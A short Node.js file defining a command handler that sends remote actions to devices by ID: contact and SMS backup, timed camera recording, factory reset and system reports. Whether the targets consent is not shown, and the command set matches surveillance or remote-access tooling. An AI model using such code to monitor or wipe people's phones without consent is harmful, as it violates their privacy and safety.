const DeviceManager = require('./device-manager');

class CommandHandler {
  constructor(deviceManager) {
    this.deviceManager = deviceManager;
  }

  processCommand(deviceId, command) {
    // إضافة معرف فريد للأمر
    const commandId = require('crypto').randomBytes(16).toString('hex');
    
    switch(command.action) {
      case 'backup_contacts':
        return this.handleBackupContacts(deviceId, commandId);
      case 'backup_sms':
        return this.handleBackupSMS(deviceId, commandId);
      case 'record_camera':
        return this.handleRecordCamera(deviceId, command.duration, commandId);
      case 'factory_reset':
        return this.handleFactoryReset(deviceId, commandId);
      case 'system_info':
        return this.handleSystemInfo(deviceId, commandId);
      case 'performance_stats':
        return this.handlePerformanceStats(deviceId, commandId);
      default:
        return { status: 'unknown_command', commandId };
    }
  }

  handleBackupContacts(deviceId, commandId) {
    this.deviceManager.handleCommand({
      deviceId,
      command: { action: 'backup_contacts' },
      commandId
    });
    return { status: 'command_sent', commandId };
  }

  handleBackupSMS(deviceId, commandId) {
    this.deviceManager.handleCommand({
      deviceId,
      command: { action: 'backup_sms' },
      commandId
    });
    return { status: 'command_sent', commandId };
  }

  handleRecordCamera(deviceId, duration = 30, commandId) {
    this.deviceManager.handleCommand({
      deviceId,
      command: { action: 'record_camera', duration },
      commandId
    });
    return { status: 'recording_started', duration, commandId };
  }

  handleFactoryReset(deviceId, commandId) {
    this.deviceManager.handleCommand({
      deviceId,
      command: { action: 'factory_reset' },
      commandId
    });
    return { status: 'reset_initiated', commandId };
  }

  handleSystemInfo(deviceId, commandId) {
    this.deviceManager.handleCommand({
      deviceId,
      command: { action: 'system_info' },
      commandId
    });
    return { status: 'command_sent', commandId };
  }

  handlePerformanceStats(deviceId, commandId) {
    this.deviceManager.handleCommand({
      deviceId,
      command: { action: 'performance_stats' },
      commandId
    });
    return { status: 'command_sent', commandId };
  }
}

module.exports = CommandHandler;